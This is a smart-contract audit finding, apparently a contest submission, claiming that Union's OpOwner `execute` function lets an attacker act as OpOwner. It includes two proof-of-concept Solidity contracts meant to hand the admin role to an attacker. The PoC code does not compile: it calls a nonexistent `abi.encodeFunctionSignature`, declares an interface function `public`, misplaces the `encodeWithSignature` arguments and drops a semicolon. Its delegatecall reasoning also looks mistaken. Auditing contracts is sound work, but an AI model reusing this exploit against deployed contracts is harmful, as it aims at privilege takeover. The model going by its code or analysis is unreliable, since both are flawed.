# Arbitrary call on OpOwner.execute function allows attacker to call contracts with OpOwner address as msg.sender

## Summary
`OpOwner.sol` contract does expose the `execute` function (https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/OpOwner.sol#L50-L60) with the modifier `onlyAuth`. The `onlyAuth` modifier will require that `msg.sender == admin()` or `msg.sender == address(ovmL2CrossDomainMessenger) && ovmL2CrossDomainMessenger.xDomainMessageSender() == owner()` to be true. 

In case we are calling as `ovmL2CrossDomainMessenger` and `ovmL2CrossDomainMessenger.xDomainMessageSender() == owner()` is true, then because `call` low level function is used, we could call contracts by using the OpOwner address as msg.sender.


## Vulnerability Detail
The following example is given:

 - The attacker crafts contractA smart contract on optimism chain which does invoke `functionA()` that calls `ovmL2CrossDomainMessenger.sendMessage(contractB, abi.encodeFunctionSignature("functionB()"), 12500000)`
 
```solidity
pragma solidity 0.8.16;

interface IOvmL2CrossDomainMessenger {
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) public; 
}

contract ContractA {

  IOvmL2CrossDomainMessenger ovmL2CrossDomainMessenger;
  address contractB;
  
  constructor(address ovmL2CrossDomainMessenger_, address contractB_) {
    ovmL2CrossDomainMessenger = IOvmL2CrossDomainMessenger(ovmL2CrossDomainMessenger_);
    contractB = contractB_;
  }

  function functionA() public {
    ovmL2CrossDomainMessenger.sendMessage(contractB, abi.encodeFunctionSignature("functionB()"), 12500000);
  }

}
```
 
 - contractB is another smart contract developed on ethereum L1 chain which does call `OpOwner.execute` (which is on L1 chain) but using the delegatecall. So we are using as `msg.sender` the address `ovmL2CrossDomainMessenger` and as storage the ContractB one.

```solidity
pragma solidity 0.8.16;

contract ContractB {

  address OpOwner_address;
  
  constructor(address OpOwner_address_) {
    OpOwner_address = OpOwner_address_;
  }

  function functionB() public {
    OpOwner_address.delegatecall(
      abi.encodeWithSignature("execute(address,uint256,bytes)"),
      OpOwner_address,
      0,
      abi.encodePacked(
          abi.encodeWithSignature("transferAdmin(address)"),
          attacker_address
      )
    )
  }

}
```

 - What happens next is that we will execute `OpOwner.execute`, in particular the loc https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/OpOwner.sol#L55 which does invoke `call` low level function, with the address and calldata arguments given by ContractB. So now we can call whatever contract using OpOwner address as msg.sender and the storage will be the callee contract one. In the example above we call `OpOwner.transferAdmin(attacker_address)`

## Impact
The vulnerability could be considered a privilege escalation.

## Recommendation
Check if msg.sender is equal to ovmL2CrossDomainMessenger, if so check the function was called by a `delegatecall` and act based on that
